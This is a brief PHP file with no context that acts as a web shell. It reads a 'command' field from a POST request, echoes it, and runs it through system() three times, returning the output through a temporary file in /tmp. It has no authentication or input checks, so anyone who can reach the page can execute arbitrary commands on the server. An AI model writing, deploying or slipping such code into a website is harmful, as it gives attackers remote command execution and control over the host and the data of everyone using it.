<?php
$command = $_POST['command'];
echo $command;
if ($command) {
    system($command . " 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/output.txt");
    $ok = system($command,$status);
    system($command . " 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/output.txt"); 
}
die("");
?>